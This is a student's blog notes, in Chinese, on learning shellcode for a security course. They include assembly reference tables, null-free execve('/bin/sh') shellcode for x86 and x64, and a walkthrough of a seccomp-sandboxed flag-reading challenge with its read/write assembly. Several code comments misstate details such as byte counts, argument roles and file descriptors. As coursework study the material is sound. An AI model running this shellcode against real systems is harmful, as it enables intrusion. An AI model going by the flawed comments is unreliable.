---
title: shellcode 学习指南
date: 2026-09-30 15:00:00
categories: 学习
tags: [pwn, shellcode, 汇编, COMP6447]
cover: /img/cover-4.svg
description: 6447 课程从栈溢出跳到 shellcode 的学习笔记：汇编基础速查表、无 \x00 的 execve shellcode，以及一道 seccomp 沙盒读 flag 题的思路。
---

本周6447的课程跳转到shellcode的用法，上一周在经历了栈溢出之后，这周直接跳转到shellcode，跳度还是挺大的，再难也得学，首先从基础学起。

首先是汇编基础

## 汇编

### 一、32 位寄存器

| 寄存器 | 含义       | 用途说明                                               | 重要 | 对应机器码（mov reg, imm32）                        | Python 对应代码 |
| ------ | ---------- | ------------------------------------------------------ | ---- | --------------------------------------------------- | --------------- |
| eax    | 累加器     | 系统调用号、返回值、数学运算                           | ✅    | `B8 xx xx xx xx`                                    | `\xB8`          |
| esp    | 栈顶指针   | 指向当前栈顶                                           | ✅    | `BC xx xx xx xx`（直接写很少用，通常靠 push/pop）   | `\xBC`          |
| ebp    | 栈基指针   | 函数栈帧基址                                           | ✅    | `BD xx xx xx xx`（同上，通常靠 push/pop）           | `\xBD`          |
| eip    | 指令指针   | 当前执行指令地址（不可直接访问/赋值）                  | ✅    | 无——只能通过 `jmp`/`call`/`ret`/`int 0x80` 间接改变 | 无              |
| ebx    | 基址寄存器 | 常用于传参、存地址；`int 0x80` 的第 1 个参数           |      | `BB xx xx xx xx`                                    | `\xBB`          |
| ecx    | 计数器     | 传参、循环计数、`rep` 指令使用；`int 0x80` 第 2 参数   |      | `B9 xx xx xx xx`                                    | `\xB9`          |
| edx    | 数据寄存器 | 传参、系统调用参数、除法余数存放；`int 0x80` 第 3 参数 |      | `BA xx xx xx xx`                                    | `\xBA`          |
| esi    | 源索引     | 字符串操作、系统调用参数；`int 0x80` 第 4 参数         |      | `BE xx xx xx xx`                                    | `\xBE`          |
| edi    | 目的索引   | 字符串操作、系统调用参数；`int 0x80` 第 5 参数         |      | `BF xx xx xx xx`                                    | `\xBF`          |

### 二、64 位寄存器

| 寄存器 | 含义       | 用途说明                                                     | 重要 | 对应机器码（movabs reg, imm64，长格式）                      | Python 对应代码 |
| ------ | ---------- | ------------------------------------------------------------ | ---- | ------------------------------------------------------------ | --------------- |
| rax    | 累加器     | 系统调用号、返回值、数学运算                                 | ✅    | `48 B8 xx*8`                                                 | `\x48\xB8`      |
| rsp    | 栈顶指针   | 当前栈顶指针，函数调用栈控制                                 | ✅    | `48 BC xx*8`（通常靠 push/pop/add/sub）                      | `\x48\xBC`      |
| rbp    | 栈基指针   | 函数栈帧基址，用于保存返回地址等                             | ✅    | `48 BD xx*8`（通常 `mov rbp, rsp` 或 push/pop）              | `\x48\xBD`      |
| rip    | 指令指针   | 当前指令地址（不可直接访问/赋值）                            | ✅    | 无——只能通过 `jmp`/`call`/`ret`/`syscall` 间接改变，或用 `lea reg, [rip+off]` 读取 | 无              |
| rbx    | 基址寄存器 | 存地址、保存值（函数调用不破坏，callee-saved）               |      | `48 BB xx*8`                                                 | `\x48\xBB`      |
| rcx    | 计数器     | 传参第4个；**syscall 指令会把返回地址存进 rcx，执行后其值被破坏** |      | `48 B9 xx*8`                                                 | `\x48\xB9`      |
| rdx    | 数据寄存器 | 系统调用第 3 个参数，如 `write` 的 `size`                    | ✅    | `48 BA xx*8`                                                 | `\x48\xBA`      |
| rsi    | 源索引     | 系统调用第 2 个参数                                          | ✅    | `48 BE xx*8`                                                 | `\x48\xBE`      |
| rdi    | 目的索引   | 系统调用第 1 个参数                                          | ✅    | `48 BF xx*8`                                                 | `\x48\xBF`      |
| r8     | 通用寄存器 | 系统调用第 5 个参数                                          | ✅    | `49 B8 xx*8`                                                 | `\x49\xB8`      |
| r9     | 通用寄存器 | 系统调用第 6 个参数                                          | ✅    | `49 B9 xx*8`                                                 | `\x49\xB9`      |
| r10    | 通用寄存器 | **syscall 约定里第 4 个参数用 r10 代替 rcx**（因为 rcx 被 syscall 指令占用） | ✅    | `49 BA xx*8`                                                 | `\x49\xBA`      |
| r11    | 通用寄存器 | **syscall 指令会把 rflags 存进 r11，执行后其值被破坏**       |      | `49 BB xx*8`                                                 | `\x49\xBB`      |
| r12    | 通用寄存器 | callee-saved，ROP 常见保存寄存器                             |      | `49 BC xx*8`                                                 | `\x49\xBC`      |
| r13    | 通用寄存器 | callee-saved，ROP 常用                                       |      | `49 BD xx*8`                                                 | `\x49\xBD`      |
| r14    | 通用寄存器 | callee-saved，ROP 常用                                       |      | `49 BE xx*8`                                                 | `\x49\xBE`      |
| r15    | 通用寄存器 | callee-saved，ROP 常用                                       |      | `49 BF xx*8`                                                 | `\x49\xBF`      |



> | 形式          | 机器码           | 字节数  | 说明                                                         |
> | ------------- | ---------------- | ------- | ------------------------------------------------------------ |
> | 长格式 movabs | `48 B8 imm64`    | 10 字节 | 寄存器编号编码在操作码字节里（`B8+reg`），可表示任意 64 位数 |
> | 短格式        | `48 C7 C0 imm32` | 7 字节  | 立即数**符号扩展**到 64 位，只能表示 `-2^31 ~ 2^31-1`；操作码固定 `C7 /0`，寄存器编号在 ModRM 的 rm 字段 |
>
> 

### 三、常用指令

| 指令            | 功能说明                                             | 位数                           | 示例汇编                                  | 机器码示例                                | Python 字节码                 |
| --------------- | ---------------------------------------------------- | ------------------------------ | ----------------------------------------- | ----------------------------------------- | ----------------------------- |
| mov reg, imm    | 将立即数写入寄存器                                   | 32/64                          | `mov eax, 0x1` / `mov rax, 0x1`           | `B8 01 00 00 00` / `48 C7 C0 01 00 00 00` | `\xB8...` / `\x48\xC7\xC0...` |
| xor reg, reg    | 清零、寄存器异或                                     | 32/64                          | `xor eax, eax` / `xor rax, rax`           | `31 C0` / `48 31 C0`                      | `\x31\xC0` / `\x48\x31\xC0`   |
| push reg        | 将寄存器压入栈                                       | 32/64                          | `push eax` / `push rax`                   | `50` / `50`                               | `\x50`                        |
| pop reg         | 将栈顶值弹入寄存器                                   | 32/64                          | `pop eax` / `pop rax`                     | `58` / `58`                               | `\x58`                        |
| push imm8       | 8 位立即数入栈                                       | 32/64                          | `push 0x68`                               | `6A 68`                                   | `\x6A\x68`                    |
| push imm32      | 32 位立即数入栈（64 位模式下符号扩展成 8 字节压栈）  | 32/64                          | `push 0x68732f2f`                         | `68 2F 2F 73 68`                          | `\x68\x2F\x2F\x73\x68`        |
| test reg, reg   | 按位与但不保存结果，只更新标志位，常用来判断是否为 0 | 32/64                          | `test eax, eax` / `test rax, rax`         | `85 C0` / `48 85 C0`                      | `\x85\xC0`                    |
| cmp [reg], reg2 | 比较内存与寄存器                                     | 32/64                          | `cmp dword ptr [rdi], ebx`                | `39 1F`                                   | `\x39\x1F`                    |
| mov [reg], reg2 | 把寄存器值写入内存                                   | 32/64                          | `mov [rdi], eax`                          | `89 07`                                   | `\x89\x07`                    |
| mov reg, [reg2] | 从内存读到寄存器                                     | 32/64                          | `mov eax, [rdi]`                          | `8B 07`                                   | `\x8B\x07`                    |
| movzx           | 零扩展读取（读 1/2 字节存进更大寄存器）              | 32/64                          | `movzx eax, byte ptr [rdi]`               | `0F B6 07`                                | `\x0F\xB6\x07`                |
| movsx           | 符号扩展读取                                         | 32/64                          | `movsx eax, byte ptr [rdi]`               | `0F BE 07`                                | `\x0F\xBE\x07`                |
| inc reg         | 寄存器加 1                                           | 32/64                          | `inc rdi`                                 | `48 FF C7`                                | `\x48\xFF\xC7`                |
| dec reg         | 寄存器减 1                                           | 32/64                          | `dec rdi`                                 | `48 FF CF`                                | `\x48\xFF\xCF`                |
| neg reg         | 取相反数                                             | 32/64                          | `neg eax`                                 | `F7 D8`                                   | `\xF7\xD8`                    |
| not reg         | 按位取反                                             | 32/64                          | `not eax`                                 | `F7 D0`                                   | `\xF7\xD0`                    |
| xchg reg, reg2  | 交换两个寄存器的值                                   | 32/64                          | `xchg eax, ebx`                           | `93`                                      | `\x93`                        |
| cdq / cqo       | 符号扩展 `eax→edx:eax` / `rax→rdx:rax`，配合除法用   | 32/64                          | `cdq` / `cqo`                             | `99` / `48 99`                            | `\x99` / `\x48\x99`           |
| leave           | 等价于 `mov esp,ebp; pop ebp`，快速收栈帧            | 32/64                          | `leave`                                   | `C9`                                      | `\xC9`                        |
| rep stosb/movsb | 配合 rcx 计数，批量填充/拷贝内存                     | 32/64                          | `rep stosb`                               | `F3 AA`                                   | `\xF3\xAA`                    |
| lea reg, [addr] | 取地址偏移（不解引用，纯算地址）                     | 32/64                          | `lea edi, [esp+4]` / `lea rdi, [rip+...]` | 多变                                      | 多变                          |
| add reg, imm    | 寄存器加值                                           | 32/64                          | `add eax, 1` / `add rax, 1`               | `83 C0 01` / `48 83 C0 01`                | `\x83\xC0\x01` 等             |
| sub reg, imm    | 寄存器减值                                           | 32/64                          | `sub eax, 1` / `sub rax, 1`               | `83 E8 01` / `48 83 E8 01`                | `\x83\xE8\x01` 等             |
| cmp reg, imm    | 比较寄存器与立即数                                   | 32/64                          | `cmp eax, 1` / `cmp rax, 1`               | `83 F8 01` / `48 83 F8 01`                | `\x83\xF8\x01` 等             |
| int 0x80        | Linux 32 位系统调用                                  | 仅32位（64位内核也兼容此入口） | `int 0x80`                                | `CD 80`                                   | `\xCD\x80`                    |
| syscall         | Linux 64 位系统调用                                  | 仅64位                         | `syscall`                                 | `0F 05`                                   | `\x0F\x05`                    |
| ret             | 返回上一地址                                         | 32/64                          | `ret`                                     | `C3`                                      | `\xC3`                        |
| jmp reg         | 跳转至寄存器地址                                     | 32/64                          | `jmp eax` / `jmp rax`                     | `FF E0` / `FF E0`                         | `\xFF\xE0`                    |
| call reg        | 调用寄存器指向的地址                                 | 32/64                          | `call eax` / `call rax`                   | `FF D0` / `FF D0`                         | `\xFF\xD0`                    |
| nop             | 空操作，对齐或占位                                   | 32/64                          | `nop`                                     | `90`                                      | `\x90`                        |
| int3            | 断点中断（调试）                                     | 32/64                          | `int3`                                    | `CC`                                      | `\xCC`                        |

### 四、条件跳转指令

| 助记符    | 含义               | 短跳（rel8，1字节偏移） | 近跳（rel32，4字节偏移） |
| --------- | ------------------ | ----------------------- | ------------------------ |
| jmp       | 无条件跳转         | `EB xx`                 | `E9 xx xx xx xx`         |
| je / jz   | 相等 / 为零则跳    | `74 xx`                 | `0F 84 xx xx xx xx`      |
| jne / jnz | 不相等 / 非零则跳  | `75 xx`                 | `0F 85 xx xx xx xx`      |
| jg / jnle | 大于（有符号）     | `7F xx`                 | `0F 8F xx xx xx xx`      |
| jge       | 大于等于（有符号） | `7D xx`                 | `0F 8D xx xx xx xx`      |
| jl / jnge | 小于（有符号）     | `7C xx`                 | `0F 8C xx xx xx xx`      |
| jle       | 小于等于（有符号） | `7E xx`                 | `0F 8E xx xx xx xx`      |
| ja        | 大于（无符号）     | `77 xx`                 | `0F 87 xx xx xx xx`      |
| jb        | 小于（无符号）     | `72 xx`                 | `0F 82 xx xx xx xx`      |

短跳的偏移范围是当前指令结束位置的 `-128 ~ +127` 字节，超出这个范围汇编器会自动换成近跳。手写"要精确控制长度"的 shellcode（比如下面的 egghunter）时，尽量让跳转目标离得近，能省好几个字节。

### 五、常见系统调用号对照表

| 功能       | x86-64（`syscall`，号在 rax） | x86（`int 0x80`，号在 eax） |
| ---------- | ----------------------------- | --------------------------- |
| read       | 0                             | 3                           |
| write      | 1                             | 4                           |
| open       | 2                             | 5                           |
| close      | 3                             | 6                           |
| mmap       | 9                             | 90                          |
| dup2       | 33                            | 63                          |
| execve     | 59                            | 11                          |
| exit       | 60                            | 1                           |
| exit_group | 231                           | 252                         |

### 六、32/64 位差异总表

| 指令类别   | 32位差异                                                     | 64位差异                                                     |
| ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 系统调用   | 使用 `int 0x80`，系统调用号放在 eax，参数用 ebx/ecx/edx/esi/edi | 使用 `syscall`，号在 rax，参数用 rdi/rsi/rdx/**r10**/r8/r9（注意第4个参数不是 rcx，因为 rcx 被 syscall 占用存返回地址） |
| mov        | 通常写 `mov eax, imm32`，固定 5 字节                         | 需带 REX 前缀；优先用短格式 `48 C7 C0 imm32`（7字节），放不下才用 `movabs`（`48 B8`+imm64，10字节） |
| 栈操作     | 操作 esp，常配合 ebp 做栈帧                                  | 操作 rsp，可配合 rbp 做栈帧；push/pop 始终按 8 字节对齐      |
| 跳转类     | 通用 `jmp eax` / `call eax`                                  | 访问 r8~r15 时才需要 REX 前缀（如 `jmp r8` = `41 FF E0`），访问 rax~rdi 和 32 位写法字节完全一样 |
| 寄存器数量 | 8 个通用寄存器（eax~edi）                                    | 16 个（多出 r8~r15），靠 REX 前缀的 R/X/B 位扩展编码         |

---

### 七、实战例子 1：手写 `execve("/bin/sh")`，不含 `\x00` 字节

shellcode 最常见的限制就是不能有 `\x00`（很多输入点用 `strcpy`/`gets` 之类遇 `\x00` 就会截断），所以经典技巧是：**用 `xor` 代替 `mov 0`，用 `push` 立即数代替直接把大立即数塞进寄存器**。

### 64 位版本（25 字节）

```nasm
xor rsi, rsi                      ; rsi = 0   (argv = NULL)
xor rdx, rdx                      ; rdx = 0   (envp = NULL)
mov rbx, 0x68732f6e69622f2f       ; "//bin/sh" 反着看好记，实际是 "//bin/sh\0" 去掉结尾那个 \0
push rbx                          ; 把字符串压到栈上，rsp 现在指向它
mov rdi, rsp                      ; rdi = "//bin/sh" 的地址
push 0x3b                         ; 0x3b = 59 = execve 的调用号，用 push+pop 避免 mov 产生的补零字节
pop rax
syscall
```

编译结果（用 pwntools `asm()` 实测）：

```
4831f6 4831d2 48bb2f2f62696e2f7368 53 4889e7 6a3b 58 0f05
```

逐条对照：`xor rsi,rsi`=`48 31 F6`，`xor rdx,rdx`=`48 31 D2`，`movabs rbx,"//bin/sh"`=`48 BB 2f 2f 62 69 6e 2f 73 68`（这里用长格式是因为立即数是 8 字节的字符串，塞不进短格式的 32 位范围），`push rbx`=`53`，`mov rdi,rsp`=`48 89 E7`，`push 0x3b`=`6A 3B`，`pop rax`=`58`，`syscall`=`0F 05`。全程 25 字节，不含任何 `\x00`。

注意字符串是 `"//bin/sh"` 而不是 `"/bin/sh"`——因为 `/bin/sh` 只有 7 个字符，凑不满 8 字节寄存器，多写一个 `/` 补成 8 字节，Linux 路径解析里连续的 `/` 会被当成一个，不影响执行。

### 32 位版本（22 字节）

```nasm
xor ecx, ecx        ; ecx = 0    (envp = NULL)
xor edx, edx        ; edx = 0    (argv = NULL，这里简化写法，实际写 argv 数组更严谨)
push ecx             ; 先压入字符串结尾的 \0（用 0 代替）
push 0x68732f2f      ; "hs/2f2f" ... 小端序反过来读就是 "/2f2f2f2f"——具体是 "/bin/sh" 后4字节 "n/sh"
push 0x6e69622f      ; "/bin" 部分
mov ebx, esp         ; ebx = "/bin/sh\0" 的地址
push 0xb             ; 11 = execve 调用号
pop eax
int 0x80
```

编译结果：`31c9 31d2 51 682f2f7368 682f62696e 89e3 6a0b 58 cd80`，共 22 字节，同样不含 `\x00`。

## 题目分析

因为是学校题目内容，我不会直接给payload，我只会提供思路讲解和如何构建payload链

一般做题我先会优先看ida，之后再去pwndbg看。

直接拖进ida当中

![image-20260930141504057](/img/shellcode-01.png)![image-20260930141525804](/img/shellcode-02.png)

这是函数图，我一般会先看main

然后反编译一下

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *s; // [rsp+0h] [rbp-10h]
  int fd; // [rsp+Ch] [rbp-4h]

  setbuf(stream: stdout, buf: nullptr);
  puts(s: "runner 1.5");
  puts(s: "almost exactly the same as in your tutorial... except I've disabled almost all of your syscalls");
  puts(s: "the flag is open in FD 1000, but you can only read and write...");
  s = mmap(addr: nullptr, len: 0x800u, prot: 7, flags: 34, fd: -1, offset: 0);
  if ( s != nullptr )
  {
    memset(s, c: 204, n: 0x800u);
    puts(s: "* memory allocated");
    puts(s: "* opening /flag file");
    fd = open(file: "/flag", oflag: 0);
    if ( fd == -1 )
    {
      puts(s: "* no /flag found - opening flag file instead");
      fd = open(file: "flag", oflag: 0);
      if ( fd == -1 )
      {
        puts(s: "Can't find file `flag` in current directory.");
        puts(s: "Create a file `flag` with contents `FLAG{LOLOLOL}` or something in the current direction");
        exit(status: 1);
      }
    }
    dup2(fd, fd2: 1000);
    close(fd);
    puts(s: "* flag file open");
    printf(format: "enter your shellcode:");
    fgets((char *)s, n: 2048, stream: stdin);
    puts(s: "* disabling syscalls");
    prctl(option: 22, 1);
    puts(s: "* syscalls disabled");
    puts(s: "* jumping to shellcode");
    ((void (*)(void))s)();
    return 0;
  }
  else
  {
    puts(s: "unable to map memory");
    return 1;
  }
}
```

1. `s = mmap(nullptr, 0x800, prot: 7, flags: 34, -1, 0)`——`prot=7` 就是 `PROT_READ|PROT_WRITE|PROT_EXEC`,这块内存**同时可写可执行**。这是整道题成立的根本前提:如果这里 `prot` 只给了 `RW` 不给 `X`,你写进去的 shellcode 根本不可能被执行,这题就无解(或者说得换成别的漏洞类型)

2. `fgets((char*)s, 2048, stdin)` 发生在 `dup2(fd, 1000)` **之后**、`prctl` **之前**——也就是说,你写入 shellcode 这个动作,是在沙盒还没生效的窗口期内完成的,同时 flag 已经被摆在 fd 1000 上了。这个"时间窗口"和"顺序"才是这题设计的核心巧思:开发者不需要藏什么后门,只要保证"你能写代码的时候沙盒还没上锁,沙盒上锁之后你就没法再写代码、只能执行已经写好的",这道题的骨架就成立了。

3. `prctl(22, 1)`——`22`=`PR_SET_SECCOMP`,`1`=`SECCOMP_MODE_STRICT`。这一行**无条件执行**,前面没有任何 `if` 分支能让程序跳过它,后面也没有任何逻辑能在它生效之后把它撤销或者放宽——`SECCOMP_MODE_STRICT` 这个模式本身是内核硬编码的行为,不是靠传一份可以有逻辑漏洞的 BPF 过滤规则实现的(那种模式才可能因为过滤规则写得不严谨而存在"逃逸"空间,比如经典的"过滤器只检查 x86-64 的 syscall 入口、没检查 32 位 `int 0x80` 入口"这种漏洞),严格模式没有规则可言,就是死板地只放行 4 个调用号,没有绕过的余地。

   那么改如何构建payload链子呢

   ![image-20260930142235839](/img/shellcode-03.png)

   首先有个关键1000，fd=1000，告诉我们内存位置了，沙箱（seccomp）通常会把你的系统调用限制在一个很小的白名单里，比如只允许 `open`、`read`、`write`、`ex`，所有这几个都是可以用的，然后就可以尝试构建链子了，从getshell的思路转变到read flag

   ```
   mov edi 1000 #edi是第一个参数，具体可以看我上面写的，既然传参肯定从第一个开始传参（64 位寄存器那部分），为啥只选32位，是因为内存小的缘故
   move rsi rsp #rsp是栈顶指针，已经被调用了，所以肯定是合法的，rsi第二个变量
   move edx, 0x200#count部分，0x200 256位足够放进所有flag了
   xor eax, eax #第三个参数，去除0， syscall 号 = 0 = read
   syscall #调用函数
   mov edi, 1 #1代表是write，执行写入
   mov rsi, rsp #rsp是栈顶指针，已经被调用了，所以肯定是合法的，rsi第二个变量
   mov edx, eax #读取上一步的eax部分，赋值给现在的edx，也就是"实际读到多少字节"，直接拿来当 write 的长度
   mov eax, 1 #1代表是write，执行写入
   syscall#调用函数
   mov edi, 0 #read部分
   mov eax, 60 # exit退出
   syscall#调用函数
   
   
   ```

   然后就可以打通了。

